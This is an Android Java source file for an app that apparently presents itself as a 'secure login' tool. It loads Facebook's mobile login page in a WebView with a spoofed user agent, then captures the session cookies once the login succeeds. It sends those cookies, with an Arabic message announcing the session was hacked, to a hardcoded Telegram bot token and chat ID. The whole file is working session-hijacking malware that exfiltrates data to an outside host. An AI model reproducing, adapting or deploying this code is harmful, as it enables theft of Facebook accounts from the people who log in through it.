package com.jasser.fbtool;
import android.app.Activity;
import android.os.Bundle;
import android.webkit.*;
import android.widget.*;
import android.view.ViewGroup;
import android.view.View;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MainActivity extends Activity {
    String token = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc";
    String chat = "5653032481";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setupUI();
    }

    private void setupUI() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(0xFF0F172A);
        layout.setPadding(40, 40, 40, 40);

        Button btn = new Button(this);
        btn.setText("تسجيل دخول آمن (V3)");
        btn.setBackgroundColor(0xFF2563EB);
        btn.setTextColor(0xFFFFFFFF);

        layout.addView(btn);
        setContentView(layout);

        btn.setOnClickListener(v -> startFB());
    }

    private void startFB() {
        WebView wv = new WebView(this);
        WebSettings settings = wv.getSettings();
        
        // --- إعدادات سحرية لتجاوز حظر فيسبوك ---
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true); // مهم جداً لفيسبوك
        settings.setDatabaseEnabled(true);
        settings.setAllowFileAccess(true);
        settings.setCacheMode(WebSettings.LOAD_DEFAULT);
        
        // انتحال شخصية متصفح كروم حديث على هاتف أندرويد 14
        String newUserAgent = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";
        settings.setUserAgentString(newUserAgent);

        CookieManager.getInstance().setAcceptCookie(true);
        CookieManager.getInstance().setAcceptThirdPartyCookies(wv, true);

        wv.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                // سحب الكوكيز فقط عند نجاح الدخول (وجود ملف الشخصي)
                String cookies = CookieManager.getInstance().getCookie(url);
                if (cookies != null && cookies.contains("c_user")) {
                    sendData("🔥 تم اختراق الجلسة بنجاح:\n" + cookies);
                }
            }
        });

        wv.loadUrl("https://m.facebook.com/login");
        setContentView(wv);
    }

    private void sendData(String text) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat + "&text=" + URLEncoder.encode(text, "UTF-8"));
                ((HttpURLConnection)url.openConnection()).getInputStream();
            } catch (Exception e) {}
        }).start();
    }
}
